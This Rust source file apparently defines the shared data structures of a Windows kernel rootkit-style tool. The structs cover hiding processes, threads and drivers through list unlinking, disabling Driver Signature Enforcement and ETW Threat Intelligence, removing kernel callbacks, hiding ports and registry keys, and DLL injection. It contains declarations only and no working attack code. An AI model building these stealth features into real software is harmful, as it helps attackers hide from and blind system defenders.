#![allow(non_camel_case_types)]
#![allow(non_snake_case)]

use core::sync::atomic::AtomicPtr;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use crate::enums::{
    Callbacks, Options, 
    PortType, Protocol
};

/// Custom implementation of the `LIST_ENTRY` structure.
///
/// This struct represents a doubly linked list entry, commonly used in low-level
/// systems programming, especially in Windows kernel structures. It contains
/// forward (`Flink`) and backward (`Blink`) pointers to other entries in the list.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct LIST_ENTRY {
    /// A pointer to the next entry in the list.
    pub Flink: *mut LIST_ENTRY,
    
    /// A pointer to the previous entry in the list.
    pub Blink: *mut LIST_ENTRY,
}

/// Represents the state of ETWTI (Event Tracing for Windows Thread Information).
///
/// This struct manages whether ETWTI is enabled or disabled for capturing thread
/// information. The `enable` field controls the activation of this feature.
#[repr(C)]
#[derive(Debug)]
pub struct ETWTI {
    /// A boolean value indicating if ETWTI is enabled (`true`) or disabled (`false`).
    pub enable: bool,
}

/// Input structure for enumeration of information.
///
/// This struct is used as input for listing various entities, based on the
/// options provided. The `options` field defines the parameters for the enumeration.
#[repr(C)]
#[derive(Debug)]
pub struct EnumerateInfoInput {
    /// The options to control how the enumeration should behave, typically set by the user.
    pub options: Options,
}

/// Represents the target process and path for a DLL or code injection.
///
/// This struct contains the necessary information to perform a code or DLL injection
/// into a target process. It includes the process identifier (PID) and the path
/// to the file or resource being injected.
#[repr(C)]
#[derive(Debug)]
pub struct TargetInjection {
    /// The process identifier (PID) of the target process where the injection will occur.
    pub pid: usize,
    
    /// The path to the file or resource (typically a DLL) to be injected into the process.
    /// This is a dynamic string (heap-allocated) that stores the full path.
    pub path: alloc::string::String,
}

/// Represents information about a network or communication port.
///
/// This struct holds information about a specific port, including the protocol used,
/// the type of port, its number, and whether the port is enabled or disabled.
#[repr(C)]
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct TargetPort {
    /// The protocol used by the port (e.g., TCP, UDP).
    /// This field is represented by the `Protocol` enum.
    pub protocol: Protocol,

    /// The type of port (e.g., local, remote).
    /// This field is represented by the `PortType` enum.
    pub port_type: PortType,

    /// The port number, represented as a 16-bit unsigned integer.
    /// Commonly used to identify network services (e.g., port 80 for HTTP).
    pub port_number: u16,

    /// A boolean value indicating whether the port is enabled (`true`) or disabled (`false`).
    pub enable: bool,
}

/// Represents the target registry key and value for operations.
///
/// This struct holds information about a specific registry key and its associated value
/// for operations such as modifying or querying the registry. It includes the registry key,
/// the value associated with that key, and a flag indicating whether the operation should be
/// enabled or not.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetRegistry {
    /// The registry key, represented as a dynamically allocated string.
    /// This is typically the path to a specific registry key (e.g., `HKEY_LOCAL_MACHINE\Software\...`).
    pub key: alloc::string::String,

    /// The value associated with the registry key, represented as a dynamically allocated string.
    /// This could be a string value stored under the specified registry key.
    pub value: alloc::string::String,

    /// A boolean value indicating whether the operation on the registry key should be enabled (`true`)
    /// or disabled (`false`).
    pub enable: bool,
}

/// Represents the target thread for operations like manipulation or monitoring.
///
/// This struct contains the thread identifier (TID) and a boolean flag indicating whether
/// the thread is enabled or disabled (hidden or active).
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetThread {
    /// The thread identifier (TID) of the target thread.
    pub tid: usize,

    /// A boolean value indicating whether the thread is enabled (`true`) or disabled/hidden (`false`).
    pub enable: bool,

    /// A pointer to the `LIST_ENTRY` structure, which represents the thread in the system's 
    /// linked list of threads. This is wrapped in an `AtomicPtr` for safe concurrent access.
    pub list_entry: AtomicPtr<LIST_ENTRY>,

    /// The options to control how the enumeration should behave, typically set by the user.
    pub options: Options,
}

/// Stores information about a target process for operations such as termination or manipulation.
///
/// This struct contains the process identifier (PID) of the target process. It is commonly used 
/// when the PID is the only information required for an operation on a process.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetProcess {
    /// The process identifier (PID) of the target process.
    pub pid: usize,

    /// A boolean value indicating whether the process is hidden (`true`) or visible (`false`).
    pub enable: bool,

    /// The signer of the process, typically indicating the authority or certificate that signed it.
    pub sg: usize,

    /// The type of protection applied to the process, represented as an integer.
    pub tp: usize,

    /// A pointer to the `LIST_ENTRY` structure, which is used to represent the process
    /// in the system's linked list of processes. This is wrapped in an `AtomicPtr` for safe concurrent access.
    pub list_entry: AtomicPtr<LIST_ENTRY>,

    /// The options to control how the enumeration should behave, typically set by the user.
    pub options: Options,
}

/// Represents information about a module in the system.
///
/// This struct is used for enumerating modules loaded in the system. It includes
/// the module's memory address, its name, and an index that can be used for
/// identification or sorting purposes.
#[repr(C)]
#[derive(Debug)]
pub struct ModuleInfo {
    /// The memory address where the module is loaded.
    pub address: usize,

    /// The name of the module, stored as a UTF-16 encoded string with a fixed length of 256.
    /// This allows compatibility with systems like Windows that use UTF-16 encoding.
    pub name: [u16; 256],

    /// The index of the module in the enumeration, useful for tracking or identifying the module.
    pub index: u8,
}

/// Represents the target module within a specific process for operations like enumeration or manipulation.
///
/// This struct contains information about the target process and the specific module within that process.
/// It includes the process identifier (PID) and the name of the module being targeted.
#[repr(C)]
#[derive(Debug)]
pub struct TargetModule {
    /// The process identifier (PID) of the process in which the target module is loaded.
    pub pid: usize,

    /// The name of the target module, stored as a dynamically allocated string.
    pub module_name: alloc::string::String,
}

/// Callback Information for Enumeration (Output)
///
/// This struct represents the information about a callback that is used in an enumeration process.
/// It includes details like the callback's memory address, name, and operations associated with it.
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct CallbackInfoOutput {
    /// The memory address where the callback is located.
    pub address: usize,
    
    /// The name of the callback, represented as a UTF-16 array of fixed length (256).
    /// This is useful for systems (like Windows) that use UTF-16 strings.
    pub name: [u16; 256],
    
    /// The index of the callback in the enumeration.
    pub index: u8,
    
    /// The memory address of the pre-operation function associated with this callback.
    pub pre_operation: usize,
    
    /// The memory address of the post-operation function associated with this callback.
    pub post_operation: usize,
}

impl Default for CallbackInfoOutput {
    fn default() -> Self {
        Self {
            address: 0,
            name: [0u16; 256],
            index: 0,
            post_operation: 0,
            pre_operation: 0
        }
    }
}

/// Callback Information for Action (Input)
///
/// This struct is used to represent input data when performing an action on a callback.
/// It includes the callback's index and the specific callback action to be taken.
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct CallbackInfoInput {
    /// The index of the callback that will be targeted by the action.
    pub index: usize,
    
    /// The specific callback action, represented by the `Callbacks` enum.
    pub callback: Callbacks,
}

/// Enumerates driver information for system drivers.
///
/// This struct holds basic information about a driver, including its address, name, and an index
/// for identification. The `name` field is represented as a UTF-16 array to maintain compatibility 
/// with systems that use this encoding (like Windows).
#[repr(C)]
pub struct DriverInfo {
    /// The memory address where the driver is loaded.
    pub address: usize,
    
    /// The name of the driver, stored as a UTF-16 encoded string with a fixed length of 256.
    pub name: [u16; 256],
    
    /// The index of the driver in the enumeration.
    pub index: u8,
}

/// Represents a structure to enable or disable Driver Signature Enforcement (DSE).
///
/// This struct is used to toggle the state of DSE, with the `enable` field indicating whether
/// DSE is currently enabled or disabled.
#[repr(C)]
#[derive(Debug)]
pub struct DSE {
    /// A boolean flag to enable or disable DSE. `true` means DSE is enabled, `false` means it is disabled.
    pub enable: bool,
}

/// Represents the target driver for operations like hiding or revealing it.
///
/// This struct holds information about a driver, specifically its name and a flag indicating whether 
/// it should be enabled (visible) or hidden.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetDriver {
    /// The name of the target driver as a dynamic string (heap-allocated).
    pub name: alloc::string::String,
    
    /// A boolean flag that indicates whether the driver is enabled (visible) or hidden. 
    /// `true` means the driver is enabled, `false` means it is hidden.
    pub enable: bool,

    /// A pointer to the `LIST_ENTRY` structure representing the driver's list in the system.
    pub list_entry: AtomicPtr<LIST_ENTRY>,

    /// A pointer to the `LDR_DATA_TABLE_ENTRY` structure that represents the driver's data in the system.
    pub driver_entry: AtomicPtr<LDR_DATA_TABLE_ENTRY>,
}